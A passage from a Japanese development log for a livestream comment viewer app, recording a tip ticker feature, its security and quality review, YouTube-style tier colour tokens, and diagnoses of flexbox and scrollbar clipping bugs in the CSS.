する前例がリポジトリに無い**ため。`viewerFormat.ts` 自身が「React 非依存の純ロジックが screens/comment-viewer に
置かれる」前例なのでそちらへ揃えた。`mergeComments`（features/）への依存は screens → features＝通常の向き。

### 変更・新規ファイル

新規: `monetaryFeed.ts` / `monetaryFeed.test.ts` / `MonetaryTicker.tsx` / `MonetaryDetailDialog.tsx` / `MonetaryTicker.test.tsx`
変更: `mergeComments.ts`（export 1 行）/ `CommentViewerApp.tsx`（state 2・ハンドラ 1・`onComments` に 1 行・要素 1）/
`CommentViewerApp.module.css`（`.ticker*` ＋ `.monetaryDialogTime` を追記・**生 hex/rgba なし**）

### テスト（20 files / **273 tests**・247 から +26）

- `monetaryFeed.test.ts` +11（chat が入らない／7 種別が入る／最新が先頭／**chat が 300 件流れても課金は消えない**
  ＝200 件クランプ対策の核心／同一 id で増えない／jewels combo で金額が差し替わる／**jewels でも中身が同じなら
  同一参照**＝レビュー Q-1 で追加／jewels 以外は差し替えない／上限で最古から落ちる／変化ゼロなら同一参照／
  StrictMode の二重実行に耐える）
- `MonetaryTicker.test.tsx` +12（0 件で描かない／ピルの中身／ビッツのラベル振替／未読件数の増減／
  押すと ✓ が付く／id を親へ返す／ダイアログの全文・時刻／要約文言／**閉じる 3 経路**／combo 更新の反映）
- `CommentViewerApp.toolbar.test.tsx` +3（**レビュー Q-2 で追加**・受信バッチの分配＝課金は一覧とティッカーの
  両方へ流れ `recordComments` も走る／chat だけならティッカーは出ない／**chat が 200 件クランプを超えても
  ティッカーの投げ銭は消えない**＝`comments` からの導出へ書き戻す退行を捕まえる唯一の層）

`CommentViewerApp` レベルの統合テストは当初**足していなかった**が、**外部レビュー（Q-2）で方針を反転して追加した**
（下記「外部レビュー対応」参照）。

### 検証

`typecheck` / `lint` / `test`（**20 files / 273 tests** PASS）。
ゼロ拡大の担保として `src-tauri/` / `comment-sidecar/` / `package.json` / `OverlayApp.tsx` / `PinnedOverlayApp.tsx` /
`PinnedCommentBar.tsx` / `CommentList.tsx` / `OverlayComment.module.css` / `pinnedComments.ts` の**差分ゼロ**と、
新規 CSS に**生 hex/rgba が無い**こと、新規コードに `invoke` / `fetch` / `localStorage` / `WebSocket` が
**1 つも無い**ことをコマンドで確認済み。実機確認（`tauri dev` ＋ dev-mock）は依頼者の環境。

### 外部レビュー（security + 品質）対応 — 2026-07-29

**セキュリティ判定「問題なし」（修正必須 0 件）**。争点だった「§9 追補〔046a〕の対象外＝軽レビューで完結」という
区分は**正しい**と確認された。根拠は主張ではなく実測＝新規/変更コードの `localStorage`/`sessionStorage`/
`indexedDB`/`document.cookie` **書き込み 0 件**（`monetaryFeed.ts` の docstring に語が出るのみ）、diff 全体の
追加行に新規キー 0 件、`fetch`/`WebSocket`/`invoke(`/`http(s)://`/`console.*`/`dangerouslySetInnerHTML` 各 0 件、
`src-tauri/`・sidecar・`package.json`・オーバーレイ 3 ファイル・`pinnedComments.ts` の差分ゼロ。
[docs/security.md](security.md) のレビュー必須条件は「**永続化**する変更」を対象とするため条文上も対象外で、
**`docs/security.md` を変更しない判断も妥当**（観点・方針・例外・必須条件のいずれも変わっていない）。
046b の S-1 経路も構造的に成立しない（永続化ゼロ→`storage` 発火ゼロ→別窓への配送経路が存在しない）。

**品質は重大な欠陥 0 件**。`mergeMonetary` の early-out・クランプ方向・冪等性・`findIndex` 選択はいずれも
全経路で正しいことを確認（`commentStream.ts` は `onComments([comment])` と**必ず 1 件ずつ**渡すため線形探索の
判断は実装どおり妥当）。`mergeComments` の 3 バケット意味論と `setComments` updater 内は 1 行も変わっていない。

対応した指摘:

| # | 指摘 | 対応 |
|---|---|---|
| Q-1 | **`hasComboPayloadChanged` のガードがテストで固定されていない**。ミューテーション検証でガードを丸ごと削除しても 269 テストが全 PASS ＝ `mergeComments` から export して共有している**唯一の理由が無防備**だった（既存ケースは comparator の true 側しか通らない） | `monetaryFeed.test.ts` に「jewels でも中身が変わっていなければ `prev` を同一参照で返す」を追加。同ミューテーションが**レッドになることを再確認** |
| Q-2 | **`onComments` の統合テスト不在**（申し送りの「配線は単体で足りる」を反転）。①アロー式→ブロック本体の書き換えは表示・TTS・保存の単一注入点への構造改変で「毎バッチ両方の setState が呼ばれる」を誰も守っていない ②`monetaryFeed.test.ts` は純関数を直接呼ぶため**`comments.filter(isMonetaryEvent)` へ書き戻す退行を構造的に検出できない**（本タスク最大の設計判断が無防備） | `CommentViewerApp.toolbar.test.tsx` に describe「047 受信バッチの分配」を追加（3 ケース）。既存の `mocks.handlers` ハーネスに相乗りし、`recordComments` を安定スパイ化。**`setMonetary` 削除・`comments` からの導出**の両ミューテーションがレッドになることを確認 |
| Q-4 | 未読チップの gap 塞ぎ（`box-shadow: 6px 0 0 0`）は**上下に隙間が残る**。影は角丸形状の平行移動コピーで、チップ約 16px 高に対しピルは約 21px 高＝上下 2.5px ずつはみ出す＋stadium の端で被覆が痩せる | `box-shadow: 6px 0 0 **6px** var(--bg)` へ（spread 6）。膨らんだ 6px は `.tickerBar` の padding 内かつ `.root` と同色なので不可視 |
| Q-5 | `.tickerBar` に `flex: none` が無い。スクロールコンテナは `min-height: auto` が 0 に解決され、`.commentSplit`（`flex-basis: 0`）は縮小配分の対象外＝**上部が窓高を超えると縮むのは一覧ではなく帯の側** | `flex: none` を追加。273px < 520px なので現状は発火しないが、縦寄与 36px が構造的な保証になる |

**修正不要と判断しコメント化した指摘**（意図・理由・再修正トリガーを該当箇所に記載）:

- **S-1「永続しない」は"ディスクに残らない"であって"画面から消える"ではない**（`CommentViewerApp.tsx` の `monetary` state）。
  投げ銭の表示名・金額の**画面滞在時間は明確に伸びた**（200 件ローリング → 配信 1 本のあいだ 50 件出しっぱなし）。
  044a のウィンドウキャプチャ対象は 2 窓のみでコメビュ本体窓を含まないため配信露出は増えないが、**画面全体
  キャプチャなら配信中ずっと映る**。コメビュ本体窓が元から持つ性質（一覧も同様に映る）で新しいリスク種別では
  ないため据え置き。再修正トリガー＝ティッカーを OBS オーバーレイへ出す要望が出たとき（§9 追補の対象になる）。
- **Q-3 ダイアログは「静かに閉じる」ではなく「閉じた後に勝手に開き直す」**（`MonetaryTicker.tsx` の `selected`）。
  対象が上限から落ちても `openId` は残るため、落ちた jewels に combo 更新が届くと `findIndex` が -1 →
  新規として先頭へ積み直され、`open` が false→true に戻って `showModal()` が走る（フォーカスも奪う）。
  発生条件が厳しいので据え置き、コメントを実態に合わせた。潰すなら effect 1 本で足りる旨も記載。
- **Q-6 第三者の任意長テキストが `.confirmDialog`（max-height 無し）に入るのは 047 が初めて**
  （`MonetaryDetailDialog.tsx`）。UA スタイルの `dialog { overflow: auto }` ＋ `dialog:modal { max-height: … }` で
  内部スクロールへ劣化する見込みだが**未実測**。`.confirmDialog` を直接触ると `ConfirmDialog` を巻き添えにするため
  ここでは足さない。再修正トリガー＝実機で窓からはみ出したら `.monetaryDialog` を**新設**して併記する。
- **申し送り5 共有の粒度**（`monetaryFeed.ts`）。比較キーは共有したが「jewels だけが更新対象」という**ポリシー自体は
  複製されている**。述語ごと寄せる（`shouldReplaceSameId`）と単一注入点へ追加改変が要るため据え置き、
  再修正トリガー＝jewels 以外でも同一 id 更新を受けるようになったとき、を明記。
- **申し送り4 既読 Set の単調増加**（`CommentViewerApp.tsx`）。判断は妥当で、コメントが「壊れ方を作りうる」と
  抽象的に書いていた**具体的な発火機構**を追記＝落ちた jewels の combo 更新は新規として積み直されるので、
  掃除 effect があると**一度読んだ投げ銭が未読として復活する**。掃除しないことが正しさに寄与している。
- **申し送り7（`useMemo` なし）／申し送り8（`aria-label` と `title` の併記・帯に `tabIndex` なし）**
  （`MonetaryTicker.tsx`）。いずれもレビューで妥当と確認。前者は `CommentList` の同種判断に揃えた旨、後者は
  「両方あるとき支援技術は `aria-label` を採用し `title` は名前計算から除外＝二重読み上げにならない」
  「フォーカス可能な子孫を含むスクロール領域はキーボード到達可能とみなされる（axe も PASS）」を明記。

**据え置いた申し送り**（レビューで妥当と確認・変更なし）: 配置（申し送り2＝`grep 'from "../../screens'` が 0 件で
`viewerFormat.ts` が前例なので `screens/` が正しい）、ティア配色不採用と改名とピン留め導線なし（申し送り3）、
jsdom の `<dialog>` 前提（申し送り9・実機確認は Q-6 とセット）。

**残る実機確認事項**（`pnpm tauri dev`）: ①Q-4 の隙間が実際に消えているか ②Q-6 の 500 字級本文でダイアログが
窓からはみ出さないか ③上部 5 段が同時に出たときの縦幅。

### 学び

- **「一覧から導出する」は上限クランプがあると成立しないことがある**。046a（固定）と 047（ティッカー）はどちらも
  「見失わないための再掲」で、どちらも `MAX_COMMENTS` に殺される構造だった。**再掲系の UI は一覧から派生させず、
  自前のウィンドウを持つ**のが正しい。
- **積む向きを変えると追従ロジックが消える**。「最新を右に足して追従する」は `useFollowScroll` 相当の状態機械が
  要るが、「最新を左に足す」だけで同じ要求（最新が常に見える・過去を見ている最中に飛ばされない）を**状態ゼロ**で
  満たせる。スクロール追従を書く前に、積む向きで解けないか疑う。
- **モーダルの土台は z-index 表を増やさない方を選ぶ**。ネイティブ `<dialog>` の top-layer は、既存の重なり順
  （`.detailPane`=5 / `.contextMenu`=20）に一切干渉しない＝将来のレイヤ追加時の考慮事項が増えない。

## 2026-07-29 (047b 課金コメントの YouTube 意匠化 — 実機フィードバックによる意匠の作り直し)

047 を実機で確認したところ**意匠が実用に耐えない**ことが分かり、意匠だけを作り直した（親
[047](tasks/047-superchat-ticker.md)）。**データ層は 1 行も触っていない**——`monetaryFeed.ts` /
`mergeMonetary` / `MONETARY_MAX` / 既読 Set の持ち方 / `CommentViewerApp.tsx` の配線はすべて無変更で、
外部通信・永続化・依存・capability もゼロ増（`docs/security.md` は変更不要のまま）。

### 報告された 5 問題と真因

| # | 症状 | 真因 |
|---|---|---|
| ① | 未読チップと課金バッチが被る／未読の左端からバッチが透ける | **構造的欠陥**。`.tickerUnread` は `border-radius: 999px` の角丸要素を `overflow-x: auto` の中に `position: sticky` で置いていた。**角丸は bounding box の四隅を塗らないので、下をスクロールするピルが四隅から必ず覗く**。047 レビュー Q-4 で入れた `box-shadow` の目張りは右側しか塞げず、左キャップの丸みは原理的に塞げない（チップ 16px 高に対しピル 21px 高で上下にもはみ出す） |
| ② | バッチが見にくい／額で色分けしたい／枠でなく塗りつぶし | **色が金額の情報を持っていなかった**（`--surface` 背景＋1px 枠＋10〜11px 文字）。ティア配色の資産は `theme.css` に既に完成していたのに、047 が「未読/既読の色信号と競合する」を理由に使っていなかった |
| ③ | バッチ同士の間隔が狭い | `gap: 6px` |
| ④ | 高さが低く細すぎる | ピル実高 ≈21px・帯 ≈33px |
| ⑤ | 何の欄か分からない | 帯に**ラベルが無い**（`aria-label` は視覚に出ない）。未読チップは 0 件で消えるので、既読が進むと帯が完全に無名になる |

### ①⑤: CSS で塞ぐのをやめ、構造で解消した

**ラベルをスクロールコンテナの外へ出す 2 ブロック構成**にした。

```
<section .tickerBar>                      ← flex 行・スクロールしない
  <div .tickerLabel>投げ銭 [未読 N]</div>  ← flex: none・右に縦罫
  <div .tickerTrack> …ピル… </div>         ← flex: 1 / min-width: 0 / overflow-x: auto（ここだけスクロール）
</section>
```

sticky も z-index も box-shadow の目張りも**全部不要**になり、透けようがない。ラベル「投げ銭」は
**未読 0 件でも消さない**ので、帯が無名になる時間が無くなる（⑤）。

**学び: 角丸のスクロール貼り付き要素は、下を通る要素を原理的に隠しきれない。**
目張りを足す前に「そもそもスクロール領域の中に置く必要があるのか」を疑うこと。

### ②: ティア配色（YouTube 準拠）を採用。047 の逸脱①を**撤回**した

047 実装時は「未読＝赤枠という色信号とティア勾配が競合する」を理由にティア配色を見送り、レビューもその判断を
妥当と評価していた。今回**依頼者の決定で未読/既読を色以外のチャネル（減光＋✓）へ移した**ため前提が外れ、
`MonetaryTicker.tsx` に書いてあった再修正トリガー（「未読/既読を枠以外のチャネルへ移したうえでピル背景に
ティアを入れる」）どおりに反転した＝**想定内の撤回**。

- **ティッカーのピル = YouTube 厳守**（依頼者の選択）。ティア色で塗りつぶし、中身は**アイコン＋金額だけ**。
  名前と種別は視覚から落ち、`aria-label` / `title` とクリックで開くダイアログが担う。
  金額を持たない種別（サブスク/メンシプ/ギフト）は金額の代わりに種別語を出す（空のピルを作らない）。
- **本体コメント一覧の課金行 = OBS と同じフルカード**（依頼者の選択）。ティア濃色のヘッダ帯
  （アイコン／名前／配信元・判定・種別チップ／金額／×N）＋同系の淡色ボディ（要約文言／本文）。
  chat 行は**完全に据え置き**。
- **既読/未読 = 既読を減光＋✓**（依頼者の選択）。色チャネルはティアが占有する。
- **固定帯（046a）も追従**させた。固定は「一覧の 1 行の再掲」なので、一覧だけ変えると同じコメントが
  2 つの見た目で出る。**ただしアイコンは出さない**——046a は localStorage に data URI を載せないため
  `toPinned` が `author.avatar` を意図的に落としており、固定帯には画像が存在しない（頭文字のみ）。
  `pinnedComments.ts` は**無変更**（保存形・キー・上限・046b の読み手契約はいずれも不変）。

#### 色トークン: `--overlay-tip-*` → `--tip-*` へ改名し、YouTube の実値へ揃えた

本体 UI が同じ配色を使うようになったため `overlay-` 接頭辞は積極的に誤解を招く（`--overlay-name-*` /
`--overlay-bubble-*` 等の OBS 専用トークンは改名していない）。あわせて **YouTube スーパーチャットの公表値
（ヘッダの濃い方）へ揃え、tone ごとに文字色 `--tip-*-fg` を持たせた**。

`theme.css` 自身が現在値を「YT 忠実を狙った**仮値**」と書き、「t1 水/t2 緑/t4 橙/subscription/membership/jewels
の白文字はコントラスト ≈2.6〜3.0:1（WCAG AA 未満）。再修正トリガー: 読みにくければ該当 bg を 1〜2 段暗くする」
という申し送りを残していた。**YouTube は明るいティア（水/緑/黄/橙）に暗文字を使っている**ので、実値へ揃えると
意匠の忠実さとコントラストが同時に解決する。

| tone | 色 | 文字 | 備考 |
|---|---|---|---|
| t0 ¥100〜 | `#1565c0` 青 | 白 | |
| t1 ¥200〜 | `#00b8d4` 水 | **暗** | 旧 `#0097a7`＋白文字は 3.4:1 |
| t2 ¥500〜 | `#00bfa5` 緑 | **暗** | 旧 `#00a66b`＋白文字は 3.1:1 |
| t3 ¥1,000〜 | `#ffb300` 黄 | 暗 | |
| t4 ¥2,000〜 | `#e65100` 橙 | **暗** | 旧 `#f57c00`＋白文字は 2.8:1 |
| t5 ¥5,000〜 | `#c2185b` 桃 | 白 | |
| t6 ¥10,000〜 | `#d00000` 赤 | 白 | |
| subscription | `#1b7f45` | 白 | 旧 `#2e9e5b` は 3.65:1 のため暗色化 |
| membership | `#00695c` | 白 | 旧 `#00897b` は 4.33:1（境界）のため暗色化 |
| jewels | `#00838f` | 白 | 旧 `#00acc1` は 2.76:1 のため暗色化 |
| gift | `#8e24aa` | 白 | 旧 `#c2185b` は **t5 と同値になる**ため色相を移した |

**現在すべての組み合わせが AA（≥4.5:1）を満たす。** 再修正トリガー＝色を足す/変えるときは必ず
`--tip-*-fg` を対で決めること（白文字なら bg 輝度 <0.22 が目安）。

⚠ **OBS オーバーレイの投げ銭カードも同じトークンを使うので見た目が変わる**（より YouTube に忠実な方向・
上記の申し送りが想定していた変更そのもの）。本体だけ変えると**配信画面と本体で同じ額のスパチャが違う色になる**
ため共有トークンごと揃えた。**受け入れられない場合は本体専用トークンを別途切る**（重複管理になるが分離は可能）。

金額バッジ（`.amountBadge` / `.tipAmount` / `.tipChip`）は「半透過の**暗**チップ＋**白**文字」固定をやめ、
**帯の文字色から `color-mix(… currentColor …)` で自己導出**するようにした。明るいティアが暗文字になったため、
固定のままだと該当ティアで金額が読めなくなる（旧 `--overlay-tip-amount-*` の 2 トークンは不要になり削除）。

### ③④: 寸法

| 対象 | 変更前 | 変更後 |
|---|---|---|
| `.tickerBar` padding | `6px 16px` | `8px 16px` |
| ピル間の gap | `6px` | **`10px`** |
| ピル | `padding: 2px 8px` / font 10〜11px / 実高 ≈21px | `padding: 3px 12px 3px 3px` / font **13px** / アイコン **24px** / 実高 **≈30px** |
| 帯の実高 | ≈33px | **≈46px** |

上部 5 段の合計は 273px → **約 286px**。既定 720px なら一覧に 434px、最小窓 520px でも 234px 残る
（`.tickerBar` の `flex: none` は 047 レビュー Q-5 で入れた分をそのまま維持）。

### 重複の解消（新規ファイル 1 つ・既存の分裂を 1 本化）

- **`viewerFormat.ts` に `monetaryTone()` を追加**。043c では `CommentList.tsx` の中に「ティア表＋種別表＋
  どちらを引くかの三項演算」がインラインで書かれていたが、本体 3 箇所（ティッカー・一覧カード・ダイアログ）と
  固定帯も同じ判定を必要としたため純関数へ引き上げた＝**複製を増やすのではなく既存の重複を解消**している。
  CSS クラス名ではなく**キー**を返すので、この module の「React/CSS/DOM 非依存」契約は保たれる。
- **`avatarDataUri()` / `authorInitial()` を `CommentList.tsx` から移設**。前者は 036a の
  「webview に外部 URL を踏ませない最終防波堤」で、**2 実装に分裂させると片方だけ緩む**のが移設の主目的。
- **新規 `monetaryTone.ts`**: tone キー → CSS クラスの対応表を本体用（`TONE_CLASS`）と OBS 用
  （`OVERLAY_TONE_CLASS`）で 1 ファイルに並べた。「tone を足したら 2 つの CSS モジュール**両方**に
  クラスを足す必要がある」ことを 1 画面で見えるようにするため。`Record<MonetaryTone, string>` なので
  **当て漏れは typecheck が落とす**（コメントではなく型が担保する）。
- dead になった CSS（`.badgeEvent` / `.combo`）は削除した。`.amount` は `ViewerDetailPanel` の 1 箇所だけが
  残り、「ティア色帯の上には流用しない」旨をコメント化した。

### テスト（20 files / **294 tests**・273 から +21）

**壊れた既存テストは 3 件だけで、いずれも事前の洗い出しどおり**（`CommentList.test.tsx` の 40 ケース超は
テキストノードを維持したため無改修で通過）。

- `MonetaryTicker.test.tsx`: ピルから種別ラベルと名前が消えたので `getByText` → **`aria-label` 経由**へ
  書き換え（視覚から消えても支援技術には出続けることを、むしろ明示的に固定した）。
- `CommentViewerApp.toolbar.test.tsx`: `toHaveTextContent("Alice")` → `within(ticker).getByRole("button", { name: /Alice/ })`。

追加したのは 21 ケース:

- `viewerFormat.test.ts` +13（`monetaryTone` の全分岐＝ティア境界/飽和・BITS 振替・金額欠落の t0 保険・
  donation/jewels は種別単色・chat/未知の劣化／`avatarDataUri` の data: 限定・`authorInitial` のコードポイント単位）
- `MonetaryTicker.test.tsx` +5（ラベル「投げ銭」が未読 0 でも消えない／金額でティア色クラスが変わる／
  金額なし種別は種別語／036a のガードが**ティッカーでも**効く 2 件）
- `CommentList.test.tsx` +7（カード化しても `onSelect` / `onPin` / 初見バッジが壊れない／金額でティア色が
  変わる／ティア非対象は種別単色／金額も本文も無くても壊れない／chat は非カード）

**ミューテーション検証（7 パターン）でテストの実効性を確認済み**——ラベル削除・036a ガード除去・ピル主表示の
空化・tone クラス未適用（一覧/ピル）・ティア判定の t0 固定、いずれもレッドになる。
`setMonetary` 削除と `comments` からの導出への書き戻し（047 レビュー Q-2 で足した統合テスト）も引き続きレッド。

### 検証

`typecheck` / `lint` / `test`（**20 files / 294 tests** PASS）。
`src-tauri/` / `comment-sidecar/` / `package.json` / `pnpm-lock.yaml` / `docs/security.md` /
`pinnedComments.ts` / `OverlayApp.tsx` / `PinnedOverlayApp.tsx` の**差分ゼロ**、CSS モジュールに
**生 hex/rgba ゼロ**（色は全て `theme.css` のトークン経由）、新規/変更コードに `invoke` / `fetch` /
`WebSocket` / `localStorage` / `console.*` が**1 つも無い**ことをコマンドで確認済み。

**⚠ 実機確認は未実施**（依頼者の環境）。次で必ず見ること:

1. **問題①の解消**: 横スクロールしてもラベルの下からピルが覗かないこと（構造で塞いだので原理的に起きないはず）。
2. **問題②④**: 各ティアのピルが判別でき金額が読めること。とくに **t1 水 / t2 緑 / t3 黄 / t4 橙の暗文字**が
   効いているか（白文字のままなら潰れる）。
3. **ライト/ダーク両テーマ**でカードボディ（`color-mix(… var(--tone-bg) 14%, var(--surface))` 導出）が破綻しないこと。
4. **OBS オーバーレイの非退行**: トークン改名と色更新のあと投げ銭カードが従来どおり出て、窓透過が壊れていないこと。
5. 長文（500 字級）の課金コメントで、一覧カードとダイアログの両方が窓からはみ出さないこと（047 レビュー Q-6 の持ち越し）。
6. 上部 5 段が同時に出た状態で、最小窓 560×520 でも一覧が潰れないこと。

### 学び

- **角丸 × sticky × スクロール領域は隠蔽に使えない**。角丸要素は bounding box の四隅を塗らないので、
  下を通る要素は必ず覗く。`box-shadow` で目張りを重ねるのは対症療法で、しかも右しか塞げなかった。
  **「隠す CSS」を足したくなったら、隠す必要のない構造にできないかを先に疑う**（今回はラベルを
  スクロールコンテナの外へ出すだけで、CSS の小細工が 3 つ同時に不要になった）。
- **「YouTube 忠実」と「アクセシビリティ」は対立しなかった**。白文字のコントラスト不足を「ブランド色だから
  仕方ない」と据え置いていたが、**YouTube 自身が明るいティアに暗文字を使っていた**。忠実さを追うと AA も満たせた。
  ブランド配色の再現でコントラストに困ったら、まず**本家がその色で何色の文字を載せているか**を確認する。
- **「使わない」と決めた再修正トリガーは実際に発火する**。047 は `superchatTier` を使わない判断を
  再修正トリガー付きで記録しており、今回その条件（未読/既読を別チャネルへ移す）が満たされて素直に反転できた。
  **逸脱を記録するときは「何が変われば戻るか」まで書く**と、次の判断がゼロから議論にならない。

## 2026-07-29 (047c 課金カードが flex で潰れる不具合の修正 — このリポジトリで 3 回目の同一バグ)

### 症状

実機報告: 「チャット一覧にチャットがたくさん流れると、課金チャットが潰れて UI が崩れる」
「**コメントが追加されるたびにどんどん潰れていって最終的に線になります**」。
047b で入れたティア色フルカードだけが縮み、chat 行は無事という非対称な壊れ方をしていた。

### 真因（Flexbox の automatic minimum size）

3 つのルールが噛み合っていた。

| # | 場所 | 内容 |
|---|---|---|
| 1 | `CommentViewerApp.module.css` `.list` | `display:flex; flex-direction:column; overflow-y:auto` |
| 2 | 同 `.item` | **`flex-shrink` 未指定＝既定 1** |
| 3 | 同 `.item.itemTipCard` | **`overflow: hidden`**（047b で追加） |

Flexbox は子の `min-height: auto`（既定）を「内容ベースの自動最小サイズ」に解決するが、
**`overflow` が `visible` 以外の子ではこれが 0 になる**（CSS Flexbox §4.5）。結果:

- chat 行（`overflow: visible`）→ 自動最小高さ＝内容高 → **縮まない**
- 課金カード（`overflow: hidden`）→ 自動最小高さ＝**0** → **いくらでも縮む**

一覧の総高が `.list` の可視高を超えると、**はみ出し分がすべて課金カードだけに配分される**。
はみ出し量はコメント 1 件につき約 40px 増えるので、**1 件流れるたびに課金カードが約 40px ずつ縮み**、
高さ 0 に達すると `.item` の `border: 1px` 上下だけが残って**ティア色の 2px の線**になる。
報告の「どんどん潰れて最終的に線になる」はこの機構でしか起きない挙動で、逆に真因の決め手になった。

### 3 回目である

同じ機構を過去 2 回踏んでおり、どちらも `flex-shrink: 0` で解決済みだった。

- 035c: `CommentViewerApp.module.css` の `.card`（設定ビューのカードが `.settingsView` の中で潰れた）
- 043c: `OverlayComment.module.css` の `.item`（OBS の投げ銭カードが潰れた・**現象の説明もそこにある**）

047b は **OBS のカード意匠（`overflow:hidden` 込み）を本体へ移植**したが、
`.item` が別 CSS モジュールなので**ガードだけが付いてこなかった**。意匠は複合セレクタで慎重に移植した一方、
その意匠が前提にしている**不可視の制約**が移植対象から漏れた形。

### 修正（CSS 2 行・1 ファイル）

- `.item` に `flex-shrink: 0` —— 根本原因。子を縮ませず、超過分は `.list` のスクロール（034a の追従）へ回す。
  chat 行は元から自動最小高さ＝内容高なので**見た目は不変**。
- `.pinnedBar` に `flex: none` —— 二次防御。帯の中身は上の 1 行で直るが、**帯自身**にも縮み止めが無く、
  `.root`（flex 縦積み）の中で `overflow-y:auto` ＝自動最小高さ 0 のため帯ごと潰れうる。
  隣の `.tickerBar` は同じ理由で既に `flex: none` を持っており、帯だけ漏れていた。

TSX・ロジック・配色トークンは 1 行も変えていない。`.item` を共有する 3 箇所
（一覧 `.list` / 固定帯 `.pinnedBar` / 視聴者詳細 `.pastList`）すべてで退行が無いことを確認。
OBS オーバーレイは別 CSS モジュールなので不変。

### テスト —— 入れられなかった（意図的に未カバー）

**この 2 行はテストで守られていない。** vitest は jsdom で**レイアウトを計算しない**
（`getBoundingClientRect()` は常に 0・CSS モジュールのクラスは識別子に置換されカスケードも走らない）ため、
「潰れないこと」は原理的に検証できない。代替として CSS ソースを読み `.item` ブロックに `flex-shrink: 0` が
あることを assert するガードテストを書いたが、**`?raw` が CSS モジュールに効かない**（Vite の CSS modules 処理が
先に走り `{}` を返す。vitest は既定で CSS を処理しないので `?inline` も空文字）ため、
`node:fs` ＝ **`@types/node` の新規追加**が必要になり、依存を増やさない判断で見送った。
代わりに CSS コメントへ「レビュー時は目視で確認すること」と再発防止ルールを明記した。

`typecheck` / `lint` / `test`（20 files / 294 tests）すべて green。

### 学び

- **意匠を別モジュールへ移植するときは、その意匠が前提にしている不可視の制約も一緒に移す**。
  今回移植したのは「見えるもの」（色・角丸・padding・`overflow:hidden`）だけで、
  それを成立させていた「見えないもの」（`flex-shrink: 0`）が落ちた。
  移植元に長い経緯コメントが付いていたのに 2 つ隣のルールだったので視野に入らなかった。
- **`overflow: hidden` を flex アイテムに足すのは、レイアウト的には「この子は 0 まで潰れてよい」と宣言すること**。
  クリップ目的で足すことが多いが、副作用は最小高さの喪失。**flex コンテナの中で `overflow` を
  `visible` 以外にしたら、必ず `flex-shrink` か `min-height` を対で見る**。
- **「どんどん潰れて最終的に線になる」のような時間発展の記述は、静的なスクリーンショットより情報量が多い**。
  1 件ごとに一定量縮む＝負の余白の比例配分、線になる＝高さ 0 ＋ border という 2 つの signature が、
  他の候補（クリップ・折り返し・スクロール）を全部落として真因を 1 つに絞った。
- **テストで守れないと分かったら、守れない事実自体をコードに残す**。「テスト無し」を黙って通すと
  次の担当者は「テストがあるから安全」と誤認する。今回は CSS コメントに未カバーの理由と目視確認の指示を書いた。

## 2026-07-29 (047d ティッカー帯が横溢れの瞬間にピルを切り落とす — 047c「症状 C」の解決編)

### 症状

047c で一覧の課金カードは直ったが、上部の「投げ銭」ティッカー帯だけが残った。実機報告:

> 以下のコメントが流れた瞬間ティッカーが縮んで、その次のコメントが流れたら元に戻りました。
> `k / kappa_lord / Twitch / ビッツ / 25,000 bits / that clutch was insane`

### ヒアリングで原因が 1 つに絞れた

推測で CSS を足さず、3 点だけ聞いた。返ってきた答えがそのまま原因の特定になった。

| 聞いたこと | 答え | 何が分かったか |
|---|---|---|
| そのときピルは横に溢れていたか | **ちょうどそのコメントで溢れた** | 引き金は**横オーバーフローの開始**＝横スクロールバーが生まれる瞬間 |
| 縮んだときピルはどう見えたか | **ピルが四角くなった**（帯もピルも細く・帯は消えてはいない） | `border-radius: 999px` のスタジアム形は**小さくなれば角丸も比例縮小して丸いまま**。四角く見えるのは**上下を切り落とされたとき**だけ ＝ **クリップの signature** |
| macOS のスクロールバー設定 | **自動的に表示（既定）** | この設定は**マウス接続時にレイアウト占有型（約 15px）へ切り替わる**。オーバーレイ表示を前提にできない |

### 真因

- 帯の高さは `.tickerBar { align-items: stretch }` により
  **`.tickerLabel`(≒16px) と `.tickerTrack`(=ピル 30px) の高い方**で決まる（通常 30 ＋ padding 16 ＋ border 1 ＝ **47px**）。
- 横オーバーフロー開始 → `.tickerTrack` に横スクロールバーが出る。
- **トラックの高さは `stretch` で外から与えられているので帯は伸びず**、content box だけが 30px → 15px に減る。
- そこに 30px のピルが入るので **`overflow-y: hidden` が上下を切り落とす** → 角丸の両端が消えて四角く見える。
- 「次のコメントで元に戻った」＝次のレイアウトでは**スクロールバーが最初から在る状態**で高さが計算し直され、
  ピルが収まる状態に落ち着いた。
  ＝ **帯の高さが「横に溢れているか」「何回目のレイアウトか」に依存してブレていた**。

### 047c との関係

**別の機構**（047c は flex の縮小配分、047d は overflow のクリップ）。共通しているのは
**「`overflow` を `visible` 以外にした箱が、外から与えられた高さの中で中身を黙って切り落とす」**という形だけ。
047b の意匠作り込みで、同じ形の罠を 2 箇所に作っていたことになる。

### 修正（CSS のみ・`.tickerTrack` 1 ルール）

- `scrollbar-width: none` ＋ `.tickerTrack::-webkit-scrollbar { display: none }` —— 根本。
  スクロールバーに縦を食わせない＝**帯の高さが溢れ状態から完全に切り離される**。
  先例は `OverlayApp.module.css` の `:global(html[data-overlay="1"] ol)::-webkit-scrollbar`（同じ手）。
  操作性は落とさない（ピルは実 `<button>` ＝ Tab で自動横スクロール、トラックパッド／Shift+ホイールも効く。
  右端で見切れたピルが affordance を担う＝ YouTube のティッカーと同じ）。
- `min-height: 30px` —— 二次防御。ピル実高（アバター 24 ＋ 縦 padding 3+3）を床として明示し、
  「切られる状態」に入れないようにする。`.tickerAvatar` / `.tickerPill` の padding と**対で動かす**旨をコメントに明記。
- `.tickerBar { align-items: stretch }` は**維持**（ラベルの `border-right` の縦罫を帯の全高に通すために必要。
  `center` にすると罫線が 16px に縮んで意匠が壊れる）。TSX・ロジック・配色トークンは不変。

`typecheck` / `lint` / `test`（20 files / 294 tests）すべて green。テストは 047c と同じ理由で追加なし
（jsdom はレイアウトも**スクロールバーの有無**も再現しない）。

### 学び

- **「ピルが四角くなった」のような形の記述が、寸法の記述より強い証拠になった**。
  角丸は要素が小さくなれば比例縮小するので、**丸いものが四角く見える＝切られている**と一意に決まる。
  「縮んだ」だけなら縮小・クリップ・折り返しの 3 候補が残るが、形の変化が 2 つを落とした。
  **不具合報告を受けるときは寸法より先に「形がどう変わったか」を聞くとよい。**
- **`align-items: stretch` は「高さを外から与える」＝子の中身が入りきる保証を外すこと**。
  子が `overflow: hidden` を持つと、足りない高さは**エラーにならず黙ってクリップされる**。
  `stretch` × `overflow:hidden` の組み合わせは、`flex-shrink` × `overflow:hidden`（047c）と同じ危険。
- **スクロールバーはレイアウトの入力である**。macOS の「自動的に表示」は**マウスの有無で占有/オーバーレイが変わる**ので、
